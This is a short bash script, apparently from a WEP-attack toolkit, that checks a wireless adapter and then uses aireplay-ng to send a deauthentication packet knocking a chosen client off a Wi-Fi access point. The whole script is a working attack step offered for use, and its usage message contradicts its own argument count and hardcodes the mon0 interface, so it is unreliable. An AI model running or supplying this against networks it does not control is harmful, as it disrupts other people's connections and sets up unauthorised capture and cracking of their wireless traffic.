#!/bin/bash

# Arg1 = Wifi Device
# Arg2 = BSSID
# Arg3 = Client Mac
num_args=3	# number of arguments

if [ ! $num_args -eq $#  ]; then 
	echo "Error: invalid usage."
	echo "    ./attack_wep.sh <adapter> <output_file> <bssid> <channel>"
	exit 1
fi

ifconfig_result=$( ifconfig $1 )
if [ ! $? -eq 0 ];then
	echo "Adapter does not exist. Do you have root?"
	exit 1
fi

sleep 2
echo "Sending Deauth packets from 'the router' to 'the client'"
sleep 2
aireplay-ng mon0 --deauth 1 -a $2 --ignore-negative-one -c $3
